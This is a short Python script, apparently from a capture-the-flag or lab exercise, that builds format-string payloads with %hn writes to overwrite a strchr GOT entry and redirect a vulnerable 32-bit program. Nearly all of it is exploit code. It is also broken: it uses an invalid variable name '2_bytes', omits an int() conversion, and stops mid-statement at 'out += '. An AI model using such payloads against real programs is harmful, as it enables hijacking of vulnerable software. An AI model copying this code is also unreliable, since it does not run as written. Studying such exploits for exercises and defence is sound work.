import sys
import struct

OFFSET = 0x81
STRCHR_GOT = 0x804998c

def calc_write_str_2_bytes(value, sp, length):
    add = 0x0
    fmt_str = ""
    condition = True
    while condition:
        # get byte from system addr
        byte = value % 65536
        # calc num chars to add to str
        add = byte - length % 65536
        if add <= 0:
            add += 65536
            length += add
        fmt_str += "%"+str(add)+"x%"+str(sp)+"$hn"
        value >>= 16
        condition = value > 0
    fmt_str += "\n"
    return fmt_str


# get sp 17 as sys.argv[1] and calc 2 bytes to write to sp 53
# the - 0x24 means that the pointer will refer to sp 44
2_bytes = (sys.argv[1], 16) - 0x24


out = ""
out += calc_write_str_2_bytes(2_bytes, 17, OFFSET)
out += 

